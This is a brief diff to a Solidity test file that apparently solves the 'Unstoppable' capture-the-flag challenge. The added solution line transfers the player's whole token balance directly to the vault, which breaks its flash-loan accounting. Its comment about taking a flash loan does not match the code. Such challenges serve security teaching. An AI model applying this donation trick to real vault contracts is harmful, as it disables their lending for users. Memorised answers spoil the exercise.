@@ -91,6 +91,11 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+       
+        // 1. Take a flash loan of 100 tokens
+        //directly sending token to vault
+        token.transfer(address(vault) , token.balanceOf(player));
+        
         
     }
 
